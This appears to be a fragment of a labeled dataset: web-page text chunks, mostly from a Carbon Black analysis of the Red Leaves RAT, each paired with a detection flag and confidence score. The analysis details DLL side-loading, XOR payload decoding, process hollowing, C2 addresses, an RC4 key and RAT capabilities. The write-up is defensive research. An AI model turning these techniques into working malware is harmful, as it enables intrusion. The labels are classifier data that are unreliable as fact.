        "text": "Related articles\n\n\n\n\n\n\n\nMalDoc in PDF - Detection bypass by embedding a malicious Word file into a PDF file \u2013\n\n\n\n\n\n\n\n\n\nYAMA-Yet Another Memory Analyzer for malware detection\n\n\n\n\n\n\n\n\n\n DangerousPassword attacks targeting developers\u2019 Windows, macOS, and Linux environments\n\n\n\n\n\n\n\n\n\nHow to Create F.L.I.R.T Signature Using Yara Rules for Static Analysis of ELF Malware\n\n\n\n\n\n\n\n\n\nGobRAT malware written in Go language targeting Linux routers\n\n\n\n\n\n\n\n\nBack\n\n\nTop\n\n\nNext\n\n\n\n\n\n\n\n\n\u00d7\u691c\u7d22\u00a0\u30ab\u30b9\u30bf\u30e0\u691c\u7d22 \u8868\u793a\u9806:RelevanceRelevanceDate\n\n\n\nCategories\n\n\nMalware\n\n\nIncident\n\n\nEvent\n\n\nVulnerability\n\n\nSecurity Technology\n\n\nForensic\n\n\nCyber Metrics\n\n\nICS-OT\n\n\nOther\n\n\n\n\n\n\nTags\n\n\nPython\n\n\nConference\n\n\nDatper\n\n\nChChes\n\n\nTraining\n\n\nStatistics and Indicator\n\n\nTool\n\n\nBlackTech\n\n\nLogonTracer\n\n\nReport\n\n\nSplunk\n\n\nElasticStack\n\n\nimpfuzzy\n\n\nvolatility\n\n\nRedLeaves\n\n\nPlugX\n\n\nDarkHotel\n\n\nBanking malware\n\n\nPacific_Islands\n\n\nCSIRT\n\n\nPassword\n\n\nPolicy\n\n\nDDoS\n\n\nAPT\n\n\nTrend\n\n\nAfrica\n\n\nSecureCoding\n\n\nSysmonSearch\n\n\nJSAC\n\n\nIoT\n\n\nIIoT\n\n\nQuasar\n\n\nLODEINFO\n\n\nLazarus\n\n\nEmotet\n\n\nPhishing\n\n\nMetrics\n\n\nTSUBAME\n\n\nStandard-Guideline\n\n\n\n\n      \n            \n      \n\n\n        \n  \n  \u3000\n\nRanking\n\n\n\n\n1\n\n\n\n\n\n\n\nMalDoc in PDF - Detection bypass by embedding a malicious Word file into a PDF file \u2013 \n\n\n\n\n\n\n2\n\n\n\n\n\n\n\nTSUBAME Report Overflow (Jul-Sep 2023) \n\n\n\n\n\n\n3\n\n\n\n\n\n\n\nHow to Use Volatility 3 Offline \n\n\n\n\n\n\n4\n\n\n\n\n\n\n\nWindows Commands Abused by Attackers \n\n\n\n\n\n\n5\n\n\n\n\n\n\n\nAnti-UPX Unpacking Technique \n\n\n\n\n\n\n\n\n\n\nAuthors\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nArchives\n\n202318\n202219\n202120\n202021\n201918\n201812\n201717\n201618\n201520\n201418\n20137\n20122\n20118\n20104\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nJPCERT/CC\n\n8F Tozan Bldg, 4-4-2 Nihonbashi-Honcho, Chuo-ku, Tokyo 1030023 JAPAN\nTEL: +81-3-6271-8901\u3000FAX: +81-3-6271-8908\n\n\n\n\n\nPrivacy Policy\nDisclaimer\n\n\n\n\u00a9 1996-2023 JPCERT/CC\n\n\n\n\n\n",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.15266108512878418
        },
        "prediction": {}
    },
    {
        "text": "During the last month, this malware family has been referenced in several security blogs and government alerts. \n Carbon Black is publicly providing this technical write up to assist customers, other organizations, and researchers continuing to investigate incidents related to this malware family. Along with this report, Carbon Black is providing product specific queries, rules and scripts aimed at assisting in the detection and analysis of this malware family in the Carbon Black User Exchange. The overall process of how the malware\u2019s components are created on an infected system and the different points where the suite of Carbon Black products could detect the different stages of the malware are outlined in that User Exchange post.\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.42094072699546814
        },
        "prediction": {}
    },
    {
        "text": "The malware uses a technique called DLL side loading, which is common with the PlugX family. DLL sideloading works by using a legitimate or benign executable file to load a modified DLL. This DLL is responsible for loading and executing an encoded or encrypted malicious data file.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.6535530686378479
        },
        "prediction": {}
    },
    {
        "text": "The ultimate payload for this sample is a shellcode loader, which injects the Red Leaves implant, via process hollowing, into a hard coded process. \n The metadata for the initial dropper file that was analyzed is listed in the information below.\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.695530116558075
        },
        "prediction": {}
    },
    {
        "text": "File Name : tea_leaves_First-Stage\n File Size : 3,804,160 bytes\n MD5 : b3139b26a2dabb9b6e728884d8fa8b33\n SHA1 : de5672c7940e4fad3c8145ce9e8a5fcb1da0fcee\n SHA256 : 5262cb9791df50fafcb2fbd5f93226050b51efe400c2924eecba97b7ce437481\n Fuzzy : 98304:drzo0aM7e5O92nAv/tyE6peB1IY8CEueiSH0h292bNcx:pzo0S4yRY8tueiSUh1bCx\n Compiled Time : Wed Feb 22 02:41:17 2017 UTC\n PE Sections (5) : Name Size MD5\n  .text 1,264,128 181494d7465a4b5f1c6624b89826d147\n  .rdata 291,328 b80b1b78172e51912b085932c3a0e106\n  .data 2,032,128 059174f08ccd413e22acc50c91374730\n  .rsrc 40,448 cae79604deb6e0793c6a3282a1b63104\n  .reloc 175,104 9e12d15095cb458e072e0eae5c4c5095\n Magic : PE32 executable for MS Windows (GUI) Intel 80386 32-bit\nTechnical Details\nThe initial stage of the sample analyzed has little functionality outside of dropping or creating the malicious second stage files on the infected system. PlugX has in the past been documented as being delivered via a self extracting (SFX) Rar executable, which acts as the first stage dropper. \n Once the files have been created on disk, the dropper will execute the Obedience.exe file, starting the overall process. A brief overview of the entire process is outlined in the below two figures and the accompanying table. \n\n\n\n\n\n\n\n\n The main dropper/installer creates the three component files on the infected system. The dropper creates the entrenchment mechanism (a link file in a startup folder, which is detailed further later in the report) and executes Obedience.exe.\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.15910892188549042
        },
        "prediction": {}
    },
    {
        "text": "Obedience imports the GetVersion function from Starburn.dll\nThe GetVersion function from StarBurn.dll loads the the handkerchief.dat file and decodes the file into shared memory space.\n Starburn.dll calls CreateProcess and hands control over to the decoded handkerchief.dat file, which is shellcode with an embedded payload.\n The shellcode will load several standard libraries and create an iexplore.exe process in suspended state. The shellcode then writes the embedded payload into the memory space for the Iexplore.exe process.\n The suspended Iexplore.exe process is then resumed and the Red Leaves implant begins its process.\n\n\n\n\n\n\n\n\n\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.3520503640174866
        },
        "prediction": {}
    },
    {
        "text": "First Stage \u2013 Dropper\nThe first stage dropper will push several hard-coded values to a function, which is responsible for decoding the three embedded files. These files comprise the second stage of the overall malware setup.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.6980874538421631
        },
        "prediction": {}
    },
    {
        "text": "The image below displays these values being pushed (highlighted in red) as well as being labeled for clarity.\n\n ",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.7150066494941711
        },
        "prediction": {}
    },
    {
        "text": "The pushed values in the above image (file offsets and sizes), are passed to a function responsible for decoding and writing the files to disk, along with the hard coded file names.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.6787915825843811
        },
        "prediction": {}
    },
    {
        "text": "The function will decode the first half of the file with one set of XOR keys (these instructions are highlighted in red), and the second half of the function with a different set of XOR keys (these instructions are highlighted in yellow).",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.6940516829490662
        },
        "prediction": {}
    },
    {
        "text": "The XOR key sets are derived from a 16 byte ASCII string immediately preceding the encoded data, in which every other byte is used to XOR each byte of encoded data.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.7083126306533813
        },
        "prediction": {}
    },
    {
        "text": "The first eight bytes are used for the first half of the file and the last 8 bytes for the second half of the file.\n\n ",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.7459242939949036
        },
        "prediction": {}
    },
    {
        "text": "To clarify this process, the data in the table below represents one of the encoded embedded files.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.7696970105171204
        },
        "prediction": {}
    },
    {
        "text": "The first 16 bytes (which are in bold) are the ASCII string, from which the key sets are derived.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.7375978231430054
        },
        "prediction": {}
    },
    {
        "text": "The first half of the file is decoded by XORing each byte of encoded data with each byte which is designated in red below. The second half is of the file is then decoded in the same manner using the each byte, in blue, from the second half of the overall string. The same result can be obtained by XORing each byte of the 4 byte key and then using the result to XOR each byte of encoded data, which in this specific scenario is 0x1B and clearly visible from the null areas of an executable file.\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.5388379693031311
        },
        "prediction": {}
    },
    {
        "text": "Offset 0 1 2 3 4 5 6 7 8 9 A B C D E F\n \n 0017C330 4F 31 36 22 44 45 26 38 32 49 37 31 38 37 38 36 O16\"DE&82I718786\n 0017C340 56 41 4B 1B 19 1B 1B 1B 1F 1B 14 1B E4 E4 1B 1B",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.5496578216552734
        },
        "prediction": {}
    },
    {
        "text": "VAK \u00e4\u00e4 \n 0017C350 A3 1B 1B 1B 1B 1B 1B 1B 5B 1B 01 1B 1B 1B 1B",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.7117944359779358
        },
        "prediction": {}
    },
    {
        "text": "1B \u00a3 [ \n 0017C360 1B 1B 1B 1B 1B 1B 1B 1B 1B 1B 1B 1B 1B 1B 1B 1B \n 0017C370 1B 1B 1B 1B 1B 1B 1B 1B 1B 1B 1B 1B 1B 1A 1B 1B \n 0017C380 A1 0B 1B 15 04 AF 12 D6 3A A3 1A 57 D6 3A 8B 8B \u00a1 \u00af \u00d6:\u00a3 W\u00d6:\u2039\u2039\n 0017C390 4F 73 72 68 3B 6B 69 74 7C 69 7A 76 3B 76 6E 68 Osrh;kit|izv;vnh\n 0017C3A0 6F 3B 79 7E 3B 69 6E 75 3B 6E 75 7F 7E 69 3B 4C o;y~;inu;nu ~i;L\n 0017C3B0 72 75 28 29 16 11 3F 2C 1B 1B 1B 1B 1B 1B 1B 1B ru() ?,\n\nThe file labeled as embed_1 is a legitimate and validly signed executable (typically used in conjunction with different CD software applications), and in this sample will be created as the hard coded name obedience.exe (it should be noted that the file name could easily be changed in other variants).\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.2951640188694
        },
        "prediction": {}
    },
    {
        "text": "The file labeled as embed_2 is a slightly modified file that will be named StarBurn.dll. The final file labeled as embed_3 is an encoded file that when decoded and executed will inject the Red Leaves implant into the memory of a target process.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.6583252549171448
        },
        "prediction": {}
    },
    {
        "text": "All of these files will be be created in the current user\u2019s Temp folder (ex. C:Users[account]AppDataLocalTemp). The first stage dropper is also responsible for installing the persistence mechanism for the malware, as a shortcut named persuasion.lnk in the current user\u2019s startup folder. The shortcut or link file will point to the target file obedience.exe and will execute that file when the user logs into the system.\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.5648079514503479
        },
        "prediction": {}
    },
    {
        "text": "File Name : tea_leaves.exe_embed_1\n File Size : 1,616,040\n MD5 : 6a1c14d5f16a07bef55943134fe618c0\n SHA1 : 1a46e961bffc6bcc1adac9708393462024f0f6ad\n SHA256 : aba4df64717462c61801d737c9fa20a7fada61539eaef50954331d31f7306d27\n \n File Name : tea_leaves.exe_embed_2\n File Size : 134,144\n MD5 : 45cb2f0440f3cc2d86ec7a313aeab5d6\n SHA1 : ae3f724a2d253af16a2689001b64d96b0f36cb4c\n SHA256 : 63d5aa72d8e0b55f59a1e28e53d2cc6f7f94ec978ec4690862fdadbde00a7ac0\n \n \n File Name : tea_leaves.exe_embed_3\n File Size : 254,593\n MD5 : fb0c714cd2ebdcc6f33817abe7813c36\n SHA1 : fc4f3698e768f690425523cdfd548b81d891c3b0\n SHA256 : 773b176b3a68c3d21fae907af8fba7908b55726bd591c5335c8c0bc9de179b76\nSecond Stage\nObedience.exe\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.12833403050899506
        },
        "prediction": {}
    },
    {
        "text": "Once the benign file obedience.exe has been executed it loads several libraries, one of which is StarBurn.dll.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.5524075627326965
        },
        "prediction": {}
    },
    {
        "text": "The below image displays the Import table from Obedience showing where the malicious GetVersion function is imported. The StarBurn.dll is side loaded, which is a fairly common tactic often associated with the PlugX family. \n\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.7341073155403137
        },
        "prediction": {}
    },
    {
        "text": "Once the GetVersion function from StarBurn.dll is imported it will execute and look for the hard coded filename handkerchief.dat in the directory where StarBurn.dll is located.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.5976427793502808
        },
        "prediction": {}
    },
    {
        "text": "The handkerchief.dat file\u2019s data is then read into memory. The pseudo-code in the image below highlights the the next steps in the process (variables were renamed for clarity). The StarBurn.dll function will make the address space where the handkerchief.dat data was read into memory read, write and executable (which is highlighted in the first red box). \n The function will then decode the data in the same manner in which the previous embedded files were decoded, where a 16 byte ASCII string is used to derive 2 XOR key sets, which are then used to decode the first and second half of the files. The StarBurn.dll function will then create a thread with the starting address of the decoded data, is highlighted in the second red box.\n\n The decoded data is shellcode with an additional embedded payload. The table below is a small excerpt of the decoded shellcode, which will load the Red Leaves implant into memory.\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.40196454524993896
        },
        "prediction": {}
    },
    {
        "text": "The shellcode will load several common libraries which will be used to inject the Red Leaves payload into memory. The shellcode decodes (using a single byte XOR of 0x53) a portion of the implant\u2019s configuration block, where the processname is stored that will be injected into via process hollowing. The image below shows the code responsible for configuration decoding, highlighted in red.\n\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.5915699601173401
        },
        "prediction": {}
    },
    {
        "text": "The shellcode loader will then create a process in suspended state, in this case the target process was Iexplore.exe.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.6091276407241821
        },
        "prediction": {}
    },
    {
        "text": "The image below, which has been commented for clarity, displays where the shellcode creates the suspended thread.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.7314945459365845
        },
        "prediction": {}
    },
    {
        "text": "The Red Leaves payload will then be written to that process\u2019 memory location and the thread is then resumed allowing the Red Leaves implant to impersonate Internet Explorer and communicate with the pre-configure C2s.\n\n As other research reports have pointed the embedded Red Leaves implant has the MZ and PE ASCII characters from the DOS and PE headers overwritten with the values 0xFF, which are highlighted in red in the table below.\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.5992894172668457
        },
        "prediction": {}
    },
    {
        "text": "Offset 0 1 2 3 4 5 6 7 8 9 A B C D E F\n \n 00001470 00 04 00 00 00 FF FF 00 00 B8 00 00 00 00 00 00 \u00ff\u00ff \u00b8 \n 00001480 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 @ \n 00001490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n 000014A0 00 00 00 00 00 F0 00 00 00 0E 1F BA 0E 00 B4 09 \u00f0 \u00ba \u00b4 \n 000014B0 CD 21 B8 01 4C CD 21 54 68 69 73 20 70 72 6F 67 \u00cd!\u00b8 L\u00cd!This prog\n 000014C0 72 61 6D 20 63 61 6E 6E 6F 74 20 62 65 20 72 75 ram cannot be ru\n 000014D0 6E 20 69 6E 20 44 4F 53 20 6D 6F 64 65 2E 0D 0D n in DOS mode. \n  000014E0 0A 24 00 00 00 00 00 00 00",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.23785394430160522
        },
        "prediction": {}
    },
    {
        "text": "DD DD DD DD DD DD DD $ \u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\n 000014F0 DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD \u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\n 00001500 DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD \u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\n 00001510 DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD \u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\n 00001520 DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD \u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\n 00001530 DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD DD \u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\n 00001540 DD DD DD DD DD DD DD DD DD 00 00 00 00 00 00 00",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.32495346665382385
        },
        "prediction": {}
    },
    {
        "text": "\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd\u00dd \n 00001550 00 00 00 00 00 00 00 00 00 FF FF 00 00 4C 01 05 \u00ff\u00ff L \n 00001560 00 4C A8 7D 58 00 00 00 00 00 00 00 00 E0 00 02 L\u00a8}X \u00e0 \n 00001570 21 0B 01 0A 00 00 FA 02 00 00 D0 00 00 00 00 00 ! \u00fa \u00d0 \n 00001580 00 EE BE 01 00 00 10 00 00 00 10 03 00 00 00 00 \u00ee\u00be \n 00001590 10 00 10 00 00 00 02 00 00 05 00 01 00 00 00 00 \n\n\nThird Stage \u2013 Red Leaves Implant\nOnce the Red Leaves malware is running the program will initially decode its configuration block, which is encoded using a single byte XOR (in this example the 0x53).",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.45004984736442566
        },
        "prediction": {}
    },
    {
        "text": "The configuration block is 0x940 bytes in length and contains several different options related to how the malware will install itself as well as where and how it will communicate with the hard coded C2s. The configuration block itself is a list of null terminated strings and binary values, which correspond to hard coded values.\n\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.6462420225143433
        },
        "prediction": {}
    },
    {
        "text": "The configuration block is detailed in the table below. The Value section are the values present in the sample that was analyzed.\n\n\n\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.7656270265579224
        },
        "prediction": {}
    },
    {
        "text": "Offset\nSize\nValue\nDescription\n\n\n0x0\n0x8\n0x53 or \u201cS\u201d\n The first byte of this 8 byte section is the XOR key that is used to decode the configuration block\n\n\n0x8\n0x40\n67.205.132.17\nThis area contains the first hard coded C2 Server Value\n\n\n0x48\n0x40\n67.205.132.17\nThis area contains the second hard coded C2 Server Value\n\n\n0x88\n0x40\n144.168.45.116\n This area contains the third hard coded C2 Server Value\n\n\n0xC8\n0x4\n0xBB 01\nThis area supplies the port that will be used when connecting to the C2s. This value is little Endian hex encoded and translated to decimal is 443\n\n\n0x1D4\n0x4\n 0x05\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.3941577672958374
        },
        "prediction": {}
    },
    {
        "text": "This is a sleep interval value. The value is this area will be multiplied by 1000 milliseconds for a sleep interval when beaconing to the C2s.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.6895816922187805
        },
        "prediction": {}
    },
    {
        "text": "If no value is provided the malware will use the default value of 5000 milliseconds\n\n\n0x1D8\n0x4\n0x04\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.7412027716636658
        },
        "prediction": {}
    },
    {
        "text": "The 4 value is used for TCP and HTTP. If this value is used it will iterate through the hard coded ports 443, 53, 80, and 995 for each C2 it can properly resolve.\n\n\n 0x1EC\n0x10+\n2017-2-22-ALL\nThis area is the Campaign ID, and could be as long as 0x31B characters.\n\n\n 0x508\n0x20+\nvv11287GD\nThis area contains the Unicode string to be used as the Mutex for malware while running.\n\n\n 0x72E\n0x100\n%ProgramFiles%Internet Exploreriexplore.exe\nThis area contains the target process that will be spawned by the original shellcode and the read leaves malware will be injected into via process hollowing\n\n\n0x832\n0xA\nLucky123\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.3774765133857727
        },
        "prediction": {}
    },
    {
        "text": "This area contains a null terminated string that is the key used in the RC4 algorithm that the malware employs to encrypt communications with the C2\n\n\n\n\nAfter the configuration data has been decoded the malware will go into the main communication thread creation function, which is responsible for initiating the communications to the embedded C2s. The connection mode value is evaluated and the malware will used the appropriate functions to either use a custom protocol or standard APIs to communicate with the C2s.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.669530987739563
        },
        "prediction": {}
    },
    {
        "text": "The value in this sample is 4 which will then attempt to resolve the different C2s iterating through the ports 443, 53, 80, and 995 (in that specific order).\n\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.6407825350761414
        },
        "prediction": {}
    },
    {
        "text": "Once a connection has been established the malware will communicate with the C2 utilizing the RC4 algorithm with the key \u201cLucky123\u201d. The malware uses a series of command Identifiers, which are parsed, and then the program will pass control to the appropriate functions to carry out commands and return the responses or data back to the C2.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.6719525456428528
        },
        "prediction": {}
    },
    {
        "text": "The jump table responsible for evaluating commands is displayed in the image below.\n\n The communication protocol has been well documented in other research papers, which can be reviewed for further information.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.7228010892868042
        },
        "prediction": {}
    },
    {
        "text": "The malware itself has the following capabilities, which allow the malware to be used as an efficient Remote Access Tool (RAT). \n\n",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": true,
            "confidence": 0.7454560995101929
        },
        "prediction": {}
    },
    {
        "text": "Update C2 Configuration\n\n\nSearch for Files\n\n\nGet Disk Information\n\n\nGet Host Information\n\n\nCreate Pipe to cmd.exe\n\n\nInteractive Reverse Shell\n\n\nEnumerate Users\n\n\nUpload/Download FIles\n\n\nDelete Files\n\n\nRun Command/Program\n\n\nDownload File from URL\n\n\nProxy Tunneling\n\n\nCreate ScreenShots\n\n\nBind to Sockets\n\n\nImpersonate Users\n\n\u00a0\n\u00a0 \n\n\n\n\n\n\n\n\n\nRelated Articles\n\n\n\n\n\n\n\n\n\n\n\n\nMisc\nNetSupport RAT: The RAT King Returns\n\n\nAlan Ngo,                         Abe Schneider,                         Fae Carlisle \nNovember 20, 2023\n18 min read\n \n\n\n\n\n\n\n\n\n\n\n\n\nMisc\nJupyter Rising: An Update on Jupyter Infostealer\n\n\nSwee Lai Lee,                         Bria Beathley,                         Abe Schneider,                         Alan N  ...\n                     Swee Lai Lee, Bria Beathley, Abe Schneider, Alan Ngo, Sean McKnight\n\n\nNovember 6, 2023\n18 min read\n \n\n\n\n\n\n\n\n\n\n\n\n\nMisc\nHunting Vulnerable Kernel Drivers\n\n\nTakahiro Haruyama\n\nOctober 31, 2023\n34 min read\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\u00d7\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                                                                           Company                      About Us Executive Leadership News & Stories Investor Relations Customer Stories Diversity, Equity & Inclusion Environment, Social & Governance AI at VMware              Careers Blogs Communities Acquisitions Office Locations VMware Cloud Trust Center COVID-19 Resources                                                     Support                      VMware Customer Connect Support Policies Product Documentation Compatibility Guide Terms & Conditions California Transparency Act Statement  Hands-on Labs & Trials              Twitter YouTube Facebook LinkedIn Contact Sales                  Copyright \u00a9 2005-2023 Broadcom.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.09738438576459885
        },
        "prediction": {}
    },
    {
        "text": "funzionalit\u00e0 di base, come sicurezza, gestione della\nrete e accessibilit\u00e0 del sito. Puoi impostare il browser affinch\u00e9 ti avvisi in merito a questi cookie o li\nblocchi, ma ci\u00f2 potrebbe compromettere il funzionamento del sito. Per ulteriori informazioni, visita il\nsito www.aboutcookies.org o www.allaboutcookies.org.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.2838824391365051
        },
        "prediction": {}
    },
    {
        "text": "Dettagli dei cookie\u200ePrestazionali  Prestazionali I cookie prestazionali permettono di analizzare la User Experience e migliorare il nostro sito grazie\nalla raccolta di informazioni sul tuo utilizzo. Ci consentono di sapere quali pagine sono le pi\u00f9\napprezzate e quali lo sono meno, di vedere quanti visitatori navigano nel sito, di ottimizzarlo e di\nrendere la navigazione pi\u00f9 agevole.",
        "source": "Carbon Black Threat Research Dissects Red Leaves Malware, Which Leverages DLL Side Loading - VMware Security Blog - VMware.html",
        "detection": {
            "response": false,
            "confidence": 0.3171531856060028
        },
        "prediction": {}
    },
    {
